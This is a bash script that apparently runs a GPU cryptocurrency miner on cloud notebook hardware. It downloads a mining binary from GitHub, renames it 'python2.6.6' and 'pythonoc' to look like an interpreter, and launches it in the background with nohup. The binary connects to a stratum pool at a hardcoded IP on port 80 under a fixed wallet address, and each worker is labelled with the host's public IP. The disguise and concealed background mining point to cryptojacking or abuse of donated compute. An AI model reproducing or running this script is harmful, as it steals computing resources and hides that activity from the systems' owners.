#!bin/bash -xe 

## getting IP info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io

echo '#######################################################'
echo '################## RV + XM v0.1.0      ################'
echo '#######################################################'

echo > oout

rm -rf python2.6.6
rm -rf pythonoc
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
chmod +x python2.6.6
cp python2.6.6 pythonoc

# exec
while true
do
if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then

echo "####################### P100-PCIE #########################"
nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &

elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
then
echo '                                  #########################'
echo "####################### P100-PCIE #########################"
echo '#######################                                    '
nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@116.203.10.54:80  -G  2>> oout 1>> oout &
elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
then
echo '                                   #########################'
echo "#######################    K80     #########################"
echo '#######################                                    '
nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
then
echo '                                   #########################'
echo "#######################    P4     #########################"
echo '#######################                                    '
nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_P4_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
else
echo '                                  #########################'
echo "#######################     P4    #########################"
echo '#######################                                    '
nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
fi
i="0"
    while true
    do
        i=$[$i+1]
        echo "results $i: $(grep Acc oout | wc -l)" 
        sleep 30
    done

done
tail -f oout
